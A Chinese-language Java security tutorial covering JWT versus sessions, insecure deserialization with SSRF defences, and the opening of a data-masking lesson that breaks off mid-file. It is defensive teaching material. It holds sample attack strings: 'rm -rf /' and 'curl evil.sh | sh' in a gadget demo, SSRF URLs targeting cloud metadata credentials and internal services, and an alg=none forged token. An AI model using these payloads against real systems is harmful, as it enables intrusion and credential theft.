### 36-07 JWT 与 Session 安全

**知识点**
- **Session 是「服务端有状态」**：登录后服务端存一份会话（内存/Redis），浏览器只拿一个随机 `SESSIONID`。好处是可随时吊销、能存任意数据；代价是集群要共享存储（Redis），且有状态。
- **JWT 是「客户端有状态」**：把用户信息 + 签名打包成一个字符串发给客户端，服务端不存。好处是无状态、好扩展；代价是**签发后无法撤销**（除非引入黑名单，那又变成有状态了）。
- **JWT 三段式**：`base64url(header).base64url(payload).base64url(signature)`。前两段只是 **Base64 编码，不是加密** —— 任何人都能解开看内容，所以**绝不能往 payload 里放密码、身份证号等敏感数据**。
- **签名才是防篡改的东西**：`signature = HMAC-SHA256(base64(header) + "." + base64(payload), secret)`（对称）或 RSA/ECDSA 私钥签名（非对称）。校验时要**重算签名并常量时间比较**，不能只解出 payload 就用。
- **`alg: none` 是经典大坑**：库如果信任头部的 `alg` 字段，攻击者改成 `"alg":"none"` 并去掉签名就能伪造。防护：**服务端固定允许的算法白名单**，绝不读客户端的 alg 决定用什么验证。
- **对称密钥泄露 = 所有人都能签发 token**：HS256 的 secret 必须 ≥ 256 位随机（`SecureRandom`），不能是 `"secret"`、项目名、配置里的默认值。多服务共享密钥时更要走密钥管理（KMS/Vault），支持轮换。
- **一定要校验的字段**：`exp`（过期时间，必须短，如 15 分钟）、`nbf`（生效时间）、`iss`（签发者）、`aud`（受众，防止 A 系统的 token 用在 B 系统）、`sub`（主体）。跳过任何一个都可能导致「过期 token 能用」「跨系统串用」。
- **access token 短 + refresh token 长**是标准组合：access 15 分钟无状态快速校验；refresh 存服务端（可撤销、可轮换、绑定设备），用于换新 access。refresh 只能用一次（一次性轮换），旧的就作废。
- **放哪里**：JWT 放 `Authorization: Bearer` 头优于放 Cookie（不吃 CSRF）；若必须放 Cookie，则要 `HttpOnly + Secure + SameSite`，并额外加 CSRF token。
- **别把 JWT 当 session 硬套**：需要「立刻踢下线」「查看在线设备」「改权限立即生效」的场景，纯 JWT 做不到，要么短过期 + 黑名单，要么老老实实用带状态的 Session。
- 易错点：把敏感信息塞 payload；secret 用默认值或提交进 Git；`exp` 设成一年；不校验 `aud`/`iss`；客户端解析 payload 就信任里面的 role（必须以服务端校验签名为准）；token 出现在 URL/日志里。

**示例代码**
```java
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;


public class JwtSessionDemo {
    static final SecureRandom RANDOM = new SecureRandom();

    /** 极简 JWT：HS256 签名，仅用于教学，真实项目用 nimbus-jose-jwt / jjwt */
    static class Jwt {
        static String b64url(byte[] b) {
            return Base64.getUrlEncoder().withoutPadding().encodeToString(b);
        }

        static byte[] b64urlDecode(String s) {
            return Base64.getUrlDecoder().decode(s);
        }

        static byte[] hmacSha256(String secret, String data) {
            try {
                Mac mac = Mac.getInstance("HmacSHA256");
                mac.init(new SecretKeySpec(secret.getBytes(StandardCharsets.UTF_8), "HmacSHA256"));
                return mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
            } catch (Exception e) {
                throw new IllegalStateException(e);
            }
        }

        static String sign(String secret, String headerJson, String payloadJson) {
            String h = b64url(headerJson.getBytes(StandardCharsets.UTF_8));
            String p = b64url(payloadJson.getBytes(StandardCharsets.UTF_8));
            String sig = b64url(hmacSha256(secret, h + "." + p));
            return h + "." + p + "." + sig;
        }

        static String[] split(String token) {
            String[] parts = token.split("\\.", -1);
            if (parts.length != 3) {
                throw new IllegalArgumentException("格式错误：段数=" + parts.length);
            }
            return parts;
        }

        /** 只看内容，不验签 —— 必须清楚这一步是不可信的 */
        static String peekPayload(String token) {
            return new String(b64urlDecode(split(token)[1]), StandardCharsets.UTF_8);
        }

        static boolean constantTimeEquals(byte[] a, byte[] b) {
            if (a.length != b.length) {
                return false;
            }
            int diff = 0;
            for (int i = 0; i < a.length; i++) {
                diff |= a[i] ^ b[i];
            }
            return diff == 0;
        }

        /** 正确校验：固定算法 + 重算签名 + 校验 exp/aud/iss */
        static String verify(String secret, String token, String expectedAud, long nowSec) {
            String[] parts = split(token);
            String header = new String(b64urlDecode(parts[0]), StandardCharsets.UTF_8);
            if (!header.contains("\"alg\":\"HS256\"")) {
                return "拒绝：算法不在白名单（只接受 HS256）";
            }
            byte[] expected = hmacSha256(secret, parts[0] + "." + parts[1]);
            byte[] actual = b64urlDecode(parts[2]);
            if (!constantTimeEquals(expected, actual)) {
                return "拒绝：签名不匹配（已被篡改）";
            }
            String payload = new String(b64urlDecode(parts[1]), StandardCharsets.UTF_8);
            long exp = readLong(payload, "\"exp\":");
            long nbf = readLong(payload, "\"nbf\":");
            String aud = readString(payload, "\"aud\":\"");
            String iss = readString(payload, "\"iss\":\"");
            if (nowSec < nbf) {
                return "拒绝：尚未生效（nbf）";
            }
            if (nowSec > exp) {
                return "拒绝：已过期（exp）";
            }
            if (!expectedAud.equals(aud)) {
                return "拒绝：受众不符（aud=" + aud + "）";
            }
            if (!"auth.example.com".equals(iss)) {
                return "拒绝：签发者不符（iss=" + iss + "）";
            }
            return "通过：" + payload;
        }

        static long readLong(String json, String key) {
            int i = json.indexOf(key);
            if (i < 0) {
                return 0;
            }
            int j = i + key.length();
            int k = j;
            while (k < json.length() && (Character.isDigit(json.charAt(k)) || json.charAt(k) == '-')) {
                k++;
            }
            return Long.parseLong(json.substring(j, k));
        }

        static String readString(String json, String key) {
            int i = json.indexOf(key);
            if (i < 0) {
                return "";
            }
            int j = i + key.length();
            int k = json.indexOf('"', j);
            return json.substring(j, k);
        }
    }

    static final String SECRET = newSecret();

    static String newSecret() {
        byte[] b = new byte[32];
        RANDOM.nextBytes(b);
        return Base64.getEncoder().encodeToString(b);
    }

    static void structure() {
        System.out.println("【JWT 长什么样：三段，前两段只是 Base64】");
        String token = Jwt.sign(SECRET, "{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
                "{\"sub\":\"user-1001\",\"role\":\"user\",\"iss\":\"auth.example.com\","
                        + "\"aud\":\"api.example.com\",\"nbf\":1000,\"exp\":1900}");
        String[] parts = Jwt.split(token);
        System.out.println("  header  : " + new String(Jwt.b64urlDecode(parts[0]), StandardCharsets.UTF_8));
        System.out.println("  payload : " + new String(Jwt.b64urlDecode(parts[1]), StandardCharsets.UTF_8));
        System.out.println("  sig     : " + parts[2].substring(0, 20) + "...");
        System.out.println("  注意：payload 用任何一个 base64 工具都能解开，不是加密");
        System.out.println("  -> 所以绝不放密码、身份证、手机号");
        System.out.println();
    }

    static void tamperDetection() {
        System.out.println("【签名防篡改：改一个字符就验不过】");
        String token = Jwt.sign(SECRET, "{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
                "{\"sub\":\"user-1001\",\"role\":\"user\",\"iss\":\"auth.example.com\","
                        + "\"aud\":\"api.example.com\",\"nbf\":1000,\"exp\":1900}");
        String[] parts = Jwt.split(token);
        // 攻击者把 role 从 user 改成 admin
        String evil = Jwt.sign(SECRET, "{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
                "{\"sub\":\"user-1001\",\"role\":\"admin\",\"iss\":\"auth.example.com\","
                        + "\"aud\":\"api.example.com\",\"nbf\":1000,\"exp\":1900}");
        System.out.println("  正常 token 校验 -> " + Jwt.verify(SECRET, token, "api.example.com", 1500));
        System.out.println();
        System.out.println("  把 payload 换成 role=admin，但不重算签名（保留原 sig）：");
        String forged = parts[0] + "." + Jwt.split(evil)[1] + "." + parts[2];
        System.out.println("    " + Jwt.verify(SECRET, forged, "api.example.com", 1500));
        System.out.println("  换了 secret 重新签：");
        String otherKey = "attacker-key-not-the-real-one-attacker-key-1234";
        String forged2 = Jwt.sign(otherKey, "{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
                "{\"sub\":\"user-1001\",\"role\":\"admin\",\"iss\":\"auth.example.com\","
                        + "\"aud\":\"api.example.com\",\"nbf\":1000,\"exp\":1900}");
        System.out.println("    " + Jwt.verify(SECRET, forged2, "api.example.com", 1500));
        System.out.println();
    }

    static void algNoneAttack() {
        System.out.println("【alg=none：信任头部算法的后果】");
        String header = Jwt.b64url("{\"alg\":\"none\",\"typ\":\"JWT\"}".getBytes(StandardCharsets.UTF_8));
        String payload = Jwt.b64url(("{\"sub\":\"user-1001\",\"role\":\"admin\","
                + "\"iss\":\"auth.example.com\",\"aud\":\"api.example.com\","
                + "\"nbf\":1000,\"exp\":9999999999}").getBytes(StandardCharsets.UTF_8));
        String token = header + "." + payload + ".";
        System.out.println("  伪造 token：" + token.substring(0, 50) + "...（签名段为空）");
        System.out.println("  我们的实现：" + Jwt.verify(SECRET, token, "api.example.com", 1500));
        System.out.println("  不校验算法的库会直接解出 role=admin 并放行");
        System.out.println("  防护：算法白名单写死在服务端，忽略客户端 header 里的 alg");
        System.out.println();
    }

    static void expiryAndAudience() {
        System.out.println("【必须校验的字段：exp / nbf / aud / iss】");
        String J = "{\"sub\":\"user-1001\",\"role\":\"user\",\"iss\":\"auth.example.com\","
                + "\"aud\":\"api.example.com\",\"nbf\":1000,\"exp\":1900}";
        String token = Jwt.sign(SECRET, "{\"alg\":\"HS256\",\"typ\":\"JWT\"}", J);
        System.out.printf("  now=1500（有效期内）   -> %s%n", Jwt.verify(SECRET, token, "api.example.com", 1500));
        System.out.printf("  now= 500（早于 nbf）   -> %s%n", Jwt.verify(SECRET, token, "api.example.com", 500));
        System.out.printf("  now=2000（晚于 exp）   -> %s%n", Jwt.verify(SECRET, token, "api.example.com", 2000));
        System.out.printf("  aud 传错（另一个系统）  -> %s%n", Jwt.verify(SECRET, token, "billing.example.com", 1500));
        System.out.println("  少校验任何一个，都会留下「过期能用」「跨系统串用」的口子");
        System.out.println();
    }

    static void sessionVsJwt() {
        System.out.println("【Session 还是 JWT：按需求选】");
        String[][] rows = {
                {"撤销 / 踢下线", "随时，删掉即失效", "做不到（除非加黑名单）"},
                {"水平扩展", "需共享存储（Redis）", "无状态，天然好扩展"},
                {"存储开销", "服务端每会话一条", "服务端不存，客户端每请求带"},
                {"能存的数据", "任意，只在服务端", "少量、非敏感（会暴露）"},
                {"篡改风险", "低（只有随机 ID）", "靠签名，实现错就危险"},
                {"适合场景", "后台管理、需要即时踢人", "开放 API、多服务、移动端"},
        };
        for (String[] r : rows) {
            System.out.println("  " + pad(r[0], 16) + " | " + pad(r[1], 24) + " | " + r[2]);
        }
        System.out.println();
    }

    static void accessAndRefresh() {
        System.out.println("【access + refresh：短token快速验，长token可撤销】");
        System.out.println("  登录 -> 发 access(15min, 无状态) + refresh(7天, 服务端存)");
        System.out.println("  每次请求带 access，服务端只验签不查库，快");
        System.out.println("  access 过期 -> 用 refresh 换新 access + 新 refresh（一次性轮换）");
        System.out.println("  旧 refresh 用过即作废；检测到旧 refresh 被复用 -> 整条会话注销（被盗信号）");
        System.out.println("  退出登录 / 改密码 -> 删服务端的 refresh，立刻生效");
        System.out.println();
        Map<String, String> sessions = new LinkedHashMap<>();
        sessions.put("refresh-abc", "user-1001");
        System.out.println("  服务端存的 refresh 列表：" + sessions.keySet());
        sessions.remove("refresh-abc");
        System.out.println("  用户点退出后：" + sessions.keySet() + "  -> access 15 分钟内仍有效，refresh 已死");
        System.out.println();
    }

    static void whereToStore() {
        System.out.println("【token 放哪里】");
        String[][] rows = {
                {"Authorization: Bearer", "不吃 CSRF，移动端友好", "推荐给 API 调用"},
                {"HttpOnly Cookie", "JS 读不到，防 XSS 窃取", "要配 SameSite + CSRF token"},
                {"localStorage", "方便", "XSS 一来 token 直接丢，不推荐"},
                {"URL 参数", "省事", "进日志/Referer/历史，禁止"},
        };
        for (String[] r : rows) {
            System.out.println("  " + pad(r[0], 24) + " | " + pad(r[1], 26) + " | " + r[2]);
        }
        System.out.println();
    }

    static void commonMistakes() {
        System.out.println("【JWT 高频错误清单】");
        String[] items = {
                "secret 是默认值/项目名/提交进 Git -> 谁都能签",
                "HS256 密钥太短（< 32 字节）-> 可被离线爆破",
                "放敏感信息进 payload（payload 只是编码）",
                "exp 设一年，token 泄露等于长期有效",
                "不校验 aud/iss -> A 系统 token 用于 B 系统",
                "信任客户端传来的 role，不重新从库里查权限",
                "算法取客户端 header 的 alg -> alg=none 伪造",
                "把 JWT 当万能方案，却要求「立刻踢下线」",
        };
        int i = 1;
        for (String s : items) {
            System.out.printf("  %d. %s%n", i++, s);
        }
        System.out.println();
    }

    static String pad(String s, int width) {
        int w = 0;
        for (int i = 0; i < s.length(); i++) {
            w += s.charAt(i) > 0x2E80 ? 2 : 1;
        }
        return s + " ".repeat(Math.max(width - w, 0));
    }

    public static void main(String[] args) {
        structure();
        tamperDetection();
        algNoneAttack();
        expiryAndAudience();
        sessionVsJwt();
        accessAndRefresh();
        whereToStore();
        commonMistakes();
    }
}
```

**课后练习**
1. 给 `Jwt.verify` 增加「黑名单」检查：维护一个已注销 `jti` 集合，实现「签发后仍能撤销」的折中方案，并分析它带来的状态回退。
2. 实现 refresh token 的一次性轮换：记录 `jti`，检测到同一 `jti` 被用第二次时判定为泄露并注销整个会话链。
3. 写一段代码说明「为什么 payload 不是加密的」：用 Base64 解码一个真实 JWT 的 payload 并打印。
4. 思考题：多服务共享一个 HS256 secret 有哪些风险？改用 RS256/ES256 非对称签名能解决什么、又引入什么开销？

---

### 36-08 不安全反序列化与 SSRF

**知识点**
- **反序列化把「数据」变成「对象」，如果数据可控且能指定类，就等于让攻击者构造对象**。Java 原生反序列化（`ObjectInputStream.readObject`）尤其危险：它信任字节流里写的类名，会去加载并调用 `readObject`，从而触发任意代码。
- ** gadget chain**：攻击者不直接写恶意类，而是把依赖库里已有的类串起来（如 `HashMap` → `TemplatesImpl`、CommonsCollections 链），最终执行命令。所以「有没有漏洞」取决于 classpath 里有没有可用的链。
- **防护首选是「不用原生反序列化」**：改用 JSON（Jackson/Gson）+ 明确的 DTO。JSON 只能构造数据，不能指定类，没有 gadget 问题。
- **如果必须反序列化，就上白名单 `ObjectInputFilter`**：只允许期望的类，其他一律拒绝。JDK 9+ 的 `ObjectInputFilter` 就是为此设计的。
- **`readObject` 要限制深度和大小**：防「反序列化炸弹」（嵌套 `HashSet` 造成指数级 `hashCode` 调用，CPU 打满）。
- **Jackson 的坑是「多态自动类型」**：开 `enableDefaultTyping()` 或 `@JsonTypeInfo` 用了 `Id.CLASS`/`Id.MINIMAL_CLASS`，攻击者就能在 JSON 里指定 `@class` 字段触发链。防护：**不用基于类名的多态**，或限定 `@JsonSubTypes` 白名单。
- **Fastjson 的 `autoType` 同类风险**：历史上大量 CVE。原则一样 —— 不信任输入里的类型名。
- **SSRF（服务端请求伪造）**：服务端有个「按 URL 抓取」的功能（图片代理、Webhook、导出 PDF），攻击者传 `http://169.254.169.254/latest/meta-data/` 去读云元数据，或 `http://127.0.0.1:6379/` 打内网 Redis。**本质是把服务端当成代理去打内网**。
- **SSRF 防护不能只靠黑名单**（`127.0.0.1`、`192.168.*` 太容易被绕过：十进制 IP、八进制、`0.0.0.0`、DNS 重绑定、302 跳转）。正确做法：**「先解析成 IP，再基于 IP 判断是否内网，然后直连这个 IP 并带上原始 Host/SNI」**，同时禁用跟随跳转，或每一跳都重新校验。
- **SSRF 的加固组合**：URL 协议白名单（只允许 `http`/`https`）、出站走独立网段 + 防火墙禁止访问元数据地址、设置超时和响应大小上限、失败信息不要回显内部细节。
- 易错点：只在第一跳校验 URL、允许任意重定向；用字符串做黑名单匹配；把内网服务当作「反正是内网所以安全」；反序列化接口对外网开放。

**示例代码**
```java
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputFilter;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.URI;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;


public class DeserializeSsrf {
    /** 允许被反序列化的类型：白名单，只有它和数据成员 */
    record Money(long cents, String currency) implements Serializable {
    }

    static byte[] serialize(Object o) {
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
                ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(o);
            return bos.toByteArray();
        } catch (Exception e) {
            throw new IllegalStateException(e);
        }
    }

    static Object readUnsafe(byte[] data) {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            return ois.readObject();
        } catch (Exception e) {
            return "反序列化异常：" + e.getClass().getSimpleName();
        }
    }

    static Object readWithFilter(byte[] data, String pattern) {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter(pattern));
            return ois.readObject();
        } catch (Exception e) {
            return "被拦截：" + e.getClass().getSimpleName();
        }
    }

    /** 模拟「危险类」：真实里是 TemplatesImpl、CommonsCollections 之类 */
    static class DangerousGadget implements Serializable {
        private static final long serialVersionUID = 1L;
        final String command;

        DangerousGadget(String command) {
            this.command = command;
        }

        private void readObject(ObjectInputStream in)
                throws java.io.IOException, ClassNotFoundException {
            in.defaultReadObject();
            System.out.println("    [gadget 在 readObject 里执行了] cmd=" + command);
        }
    }

    static void whyNativeIsDangerous() {
        System.out.println("【原生反序列化：字节流里的类名被信任】");
        byte[] good = serialize(new Money(1999, "CNY"));
        System.out.println("  正常数据 " + good.length + " 字节，读出来 -> " + readUnsafe(good));
        System.out.println();
        byte[] evil = serialize(new DangerousGadget("rm -rf /"));
        System.out.println("  恶意数据 " + evil.length + " 字节，直接读：");
        System.out.println("    结果 -> " + readUnsafe(evil));
        System.out.println("  问题：readObject 被自动调用，构造对象时就执行了副作用");
        System.out.println("  真实 gadget 链不需要自定义类，用依赖库里的类就能达成");
        System.out.println();
    }

    static void whitelistFilter() {
        System.out.println("【ObjectInputFilter：只放行白名单类】");
        byte[] good = serialize(new Money(1999, "CNY"));
        byte[] evil = serialize(new DangerousGadget("curl evil.sh | sh"));

        String pattern = "DeserializeSsrf$Money;java.lang.Long;java.lang.String;!*";
        System.out.println("  filter: " + pattern);
        System.out.println("    正常数据 -> " + readWithFilter(good, pattern));
        System.out.println("    恶意数据 -> " + readWithFilter(evil, pattern));
        System.out.println("  规则：列出允许的类，末尾 !* 表示其余全部拒绝");
        System.out.println("  再加一层：限制数组长度、对象深度、字节数上限，防反序列化炸弹");
        System.out.println();
    }

    static void preferJson() {
        System.out.println("【首选：换掉原生序列化】");
        String[][] rows = {
                {"Java 原生", "可指定任意类，有 gadget 风险", "不要用于跨边界数据"},
                {"JSON + DTO", "只能构造数据，类固定", "推荐，接口首选"},
                {"Protobuf/Thrift", "schema 固定，无类型注入", "服务间通信推荐"},
                {"YAML（SnakeYAML 旧版）", "!! 可指定类", "用 safeLoads / 新版本"},
                {"XML（XStream 等）", "可指定类", "禁止或严格白名单"},
        };
        for (String[] r : rows) {
            System.out.println("  " + pad(r[0], 20) + " | " + pad(r[1], 26) + " | " + r[2]);
        }
        System.out.println();
        System.out.println("  Jackson 特别提醒：别开 enableDefaultTyping()");
        System.out.println("    @JsonTypeInfo(use = Id.CLASS) 会读输入里的类名 -> 等于原生反序列化的坑");
        System.out.println("    多态要用 @JsonSubTypes 显式列白名单，或用逻辑名而非类名");
        System.out.println();
    }

    static void ssrfIntro() {
        System.out.println("【SSRF：让服务端去访问内网】");
        System.out.println("  功能：POST /api/fetch-image  body: {\"url\": \"...\"}");
        String[] attacks = {
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/  <- 偷云凭证",
                "http://127.0.0.1:6379/  <- 触达内网 Redis",
                "http://192.168.1.1/admin  <- 打内网管理后台",
                "http://[::1]:8080/actuator/env  <- IPv6 环回绕过",
                "file:///etc/passwd  <- 读本地文件（若支持 file 协议）",
        };
        for (String a : attacks) {
            System.out.println("    " + a);
        }
        System.out.println("  统计：服务端能访问的东西，比攻击者自己能访问的多得多");
        System.out.println();
    }

    /** 演示用的静态 DNS 表，避免依赖真实解析结果 */
    static final Map<String, String> FAKE_DNS = new LinkedHashMap<>();

    static {
        FAKE_DNS.put("images.example.com", "203.0.113.20");
        FAKE_DNS.put("internal.corp", "10.0.5.7");
        FAKE_DNS.put("rebind.example.com", "203.0.113.99");
    }

    static long parseNumber(String s) {
        try {
            if (s.startsWith("0x") || s.startsWith("0X")) {
                return Long.parseLong(s.substring(2), 16);
            }
            if (s.length() > 1 && s.charAt(0) == '0') {
                return Long.parseLong(s.substring(1), 8);
            }
            return Long.parseLong(s);
        } catch (NumberFormatException e) {
            return -1;
        }
    }

    /** 把各种 IP 写法归一化成点分十进制；不是 IP 字面量则返回 null */
    static String toDotted(String host) {
        if (host == null || host.isEmpty()) {
            return null;
        }
        if (host.startsWith("[") && host.endsWith("]")) {
            return host.substring(1, host.length() - 1);
        }
        if (host.indexOf('.') < 0) {
            long v = parseNumber(host);
            if (v < 0 || v > 0xFFFFFFFFL) {
                return null;
            }
            return ((v >> 24) & 255) + "." + ((v >> 16) & 255) + "."
                    + ((v >> 8) & 255) + "." + (v & 255);
        }
        String[] p = host.split("\\.", -1);
        if (p.length == 4) {
            long[] n = new long[4];
            for (int i = 0; i < 4; i++) {
                n[i] = parseNumber(p[i]);
                if (n[i] < 0 || n[i] > 255) {
                    return null;
                }
            }
            return n[0] + "." + n[1] + "." + n[2] + "." + n[3];
        }
        if (p.length == 2) {
            long a = parseNumber(p[0]);
            long b = parseNumber(p[1]);
            if (a < 0 || a > 255 || b < 0 || b > 0xFFFFFF) {
                return null;
            }
            return a + "." + ((b >> 16) & 255) + "." + ((b >> 8) & 255) + "." + (b & 255);
        }
        return null;
    }

    /** getHost() 对 127.1、2130706433 这类写法可能返回 null，回退到 authority 并去掉端口 */
    static String hostOf(URI uri) {
        String host = uri.getHost();
        if (host != null && !host.isEmpty()) {
            return host;
        }
        String auth = uri.getAuthority();
        if (auth == null) {
            return null;
        }
        int at = auth.lastIndexOf('@');
        if (at >= 0) {
            auth = auth.substring(at + 1);
        }
        if (auth.startsWith("[")) {
            int close = auth.indexOf(']');
            return close > 0 ? auth.substring(0, close + 1) : auth;
        }
        int colon = auth.indexOf(':');
        return colon >= 0 ? auth.substring(0, colon) : auth;
    }

    static String resolveHost(String host) {
        if (host == null || host.isEmpty()) {
            return null;
        }
        String fake = FAKE_DNS.get(host);
        return fake != null ? fake : toDotted(host);
    }

    /** 按解析出的 IP 判归属，而不是按字符串 */
    static String classify(String ip) {
        if (ip.contains(":")) {
            if (ip.equals("::1") || ip.equals("::") || ip.startsWith("fe80")
                    || ip.startsWith("fc") || ip.startsWith("fd")) {
                return "内网/环回";
            }
            return "公网";
        }
        String[] p = ip.split("\\.");
        int a = Integer.parseInt(p[0]);
        int b = Integer.parseInt(p[1]);
        if (a == 127 || a == 10 || a == 0) {
            return "内网/环回";
        }
        if (a == 169 && b == 254) {
            return "链路本地（云元数据）";
        }
        if (a == 192 && b == 168) {
            return "内网";
        }
        if (a == 172 && b >= 16 && b <= 31) {
            return "内网";
        }
        if (a == 100 && b >= 64 && b <= 127) {
            return "运营商级 NAT";
        }
        return "公网";
    }

    static String validateUrl(String raw) {
        URI uri;
        try {
            uri = URI.create(raw);
        } catch (Exception e) {
            return "拒绝：URL 非法";
        }
        String scheme = uri.getScheme();
        if (scheme == null || !(scheme.equals("http") || scheme.equals("https"))) {
            return "拒绝：协议不在白名单（" + scheme + "）";
        }
        String host = hostOf(uri);
        if (host == null || host.isEmpty()) {
            return "拒绝：缺少主机名";
        }
        String ip = resolveHost(host);
        if (ip == null) {
            return "拒绝：无法解析主机（" + host + "）";
        }
        String kind = classify(ip);
        if (!kind.equals("公网")) {
            return "拒绝：" + kind + "（" + host + " -> " + ip + "）";
        }
        int port = uri.getPort() < 0 ? (scheme.equals("https") ? 443 : 80) : uri.getPort();
        return "通过 -> 直连 " + ip + ":" + port + "（Host: " + host + "）";
    }

    static void ssrfDefenses() {
        System.out.println("【SSRF 防护：先解析 IP，再按 IP 判断】");
        String[] inputs = {
                "https://images.example.com/a.png",
                "http://127.0.0.1/admin",
                "http://169.254.169.254/latest/meta-data/",
                "http://2130706433/",
                "file:///etc/passwd",
                "http://internal.corp:8080/",
        };
        for (String s : inputs) {
            System.out.println("  " + pad(s, 40) + " -> " + validateUrl(s));
        }
        System.out.println("  通过的那条是「直连 IP + 覆盖 Host」，这样 DNS 再重绑定也改不了目标");
        System.out.println();
    }

    static boolean naiveBlacklist(String raw) {
        String lower = raw.toLowerCase();
        return lower.contains("127.0.0.1") || lower.contains("localhost")
                || lower.contains("169.254") || lower.contains("192.168.")
                || lower.contains("10.0.");
    }

    static void ssrfBypasses() {
        System.out.println("【为什么黑名单字符串匹配挡不住】");
        String[] urls = {
                "http://127.0.0.1/",
                "http://2130706433/",
                "http://0x7f000001/",
                "http://127.1/",
                "http://[::1]/",
                "http://192.168.1.1/",
                "http://169.254.169.254/",
        };
        System.out.println("  " + pad("输入", 24) + " | " + pad("解析结果", 16) + " | "
                + pad("真实归属", 22) + " | 黑名单");
        for (String u : urls) {
            String host = hostOf(URI.create(u));
            String ip = resolveHost(host);
            String kind = ip == null ? "无法解析" : classify(ip);
            String blocked = naiveBlacklist(u) ? "挡住" : "漏过";
            System.out.println("  " + pad(u, 24) + " | " + pad(String.valueOf(ip), 16) + " | "
                    + pad(kind, 22) + " | " + blocked);
        }
        System.out.println();
        System.out.println("  还有两种黑名单根本看不到的：");
        System.out.println("    http://evil.com -> 302 -> http://127.0.0.1/   只校验首跳就漏");
        System.out.println("    http://rebind.example.com/                   校验时是公网，请求时变内网");
        System.out.println();
        System.out.println("  正确组合：");
        System.out.println("    1) 协议白名单 http/https，禁用 file/gopher/dict");
        System.out.println("    2) 解析出 IP 后判内网，然后直连该 IP（防重绑定）");
        System.out.println("    3) 禁止自动跟随跳转；必要时每跳重新校验");
        System.out.println("    4) 出站放独立网段，防火墙禁 169.254.169.254 与内网段");
        System.out.println("    5) 超时、响应大小上限、不回显内部错误细节");
        System.out.println();
    }

    static void checklist() {
        System.out.println("【边界数据安全清单】");
        List<String> items = new ArrayList<>(List.of(
                "对外接口不用 Java 原生反序列化",
                "必须用时配 ObjectInputFilter 白名单 + 深度/大小限制",
                "禁用 Jackson default typing；多态用 @JsonSubTypes 白名单",
                "URL 抓取类功能：协议白名单 + IP 判内网 + 禁跳转",
                "云主机开启 IMDSv2（要求 token），降低元数据被读风险",
                "出站流量走专用出口，能审计、能限流",
                "错误信息不暴露内网拓扑与实现细节"));
        Map<String, Boolean> audited = new LinkedHashMap<>();
        for (String s : items) {
            audited.put(s, false);
        }
        int i = 1;
        for (String s : audited.keySet()) {
            System.out.printf("  [ ] %d. %s%n", i++, s);
        }
        System.out.println();
    }

    static String pad(String s, int width) {
        int w = 0;
        for (int i = 0; i < s.length(); i++) {
            w += s.charAt(i) > 0x2E80 ? 2 : 1;
        }
        return s + " ".repeat(Math.max(width - w, 0));
    }

    public static void main(String[] args) {
        whyNativeIsDangerous();
        whitelistFilter();
        preferJson();
        ssrfIntro();
        ssrfDefenses();
        ssrfBypasses();
        checklist();
    }
}
```

**课后练习**
1. 给 `readWithFilter` 增加「最大字节数」和「最大深度」限制，构造一个反序列化炸弹（深层嵌套容器）验证会被挡下。
2. 改进 `validateUrl`：解析出 IP 后不再用主机名请求，写出「直连 IP + 覆盖 Host 头」的实现思路（伪代码即可）。
3. 列出你熟悉的框架里所有「按用户输入加载类/协议」的配置项（Jackson、XStream、SnakeYAML、Spring 的 SpEL），各写一条安全基线。
4. 思考题：为什么「只在内网部署」不能作为 SSRF 的缓解措施？举一个内网被 SSRF 打穿的后果。

---

### 36-09 敏感信息泄露与日志脱敏

**知识点**
- **敏感信息泄露是最常见也最容易被忽视的漏洞**：不在业务逻辑里，而在「顺手打的一条日志」「异常栈直接返回前端」「报错页面显示 SQL」。
- **数据分级**：公开 / 内部 / 机密 / 绝密。身份证、手机号、银行卡、密码、token、密钥、健康记录属于机密以上，任何出口（日志、响应、监控、消息队列、缓存、备份、截图）都要脱敏或加密。
- **脱敏不是「删掉」，而是「保留可用性」**：手机号 `138****8888`、身份证 `110101********1234`、卡号 `**** **** **** 1234`。客服需要按后四位查单，所以后四位要留。
- **日志要分层**：DEBUG 可以详细但要本地开关；生产默认 INFO，且**日志本身不能带敏感字段**。用日志框架的脱敏（如 Logback 的 `ReplacingCompositeConverter`、Log4j2 的 `PatternLayout` 替换）做兜底，但不要只靠它。
- **异常不能直接回前端**：`e.printStackTrace()` 到响应体，会泄露类名、路径、SQL、中间件版本。应该返回统一错误码 + 请求 ID，详细信息只进服务端日志。
- **HTTP 响应头也会泄露**：`Server: nginx/1.18.0`、`X-Powered-By: PHP/7.4`、`X-AspNet-Version`。关掉或改掉版本信息。
- **响应体要按需返回**：`SELECT *` 后把整个实体序列化，会把 `password_hash`、`salt`、内部备注一起发出去。用 DTO 显式挑字段，不要「图省事全返回」。
- **前端 Map/JSON 里的隐藏字段**：`<input type="hidden" value="user_id=1">`、注释里的 TODO、source map 里未压缩的代码，都是泄露源。
- **错误信息要统一**：登录失败统一提示「用户名或密码错误」，不要区分「用户不存在」/「密码错误」（用户枚举）。忘记密码同理。
- **脱敏要正则在「输出前」做，而不是在「输入时」做**：输入时脱敏会破坏业务（比如你还要用完整手机号发短信），输出时脱敏才对。
- **审计日志与业务日志分开**：谁在什么时候改了什么，要能追溯，但审计日志本身也要防篡改、防泄露。
- 易错点：把脱敏写在 `toString()` 里以为万无一失（反射、序列化、`Objects.toString` 可能绕过）；日志里打印完整请求体；把 token 拼进 URL；监控大盘直接显示原始数据。

**示例代码**
```java
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.function.Function;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class SensitiveDataMasking {
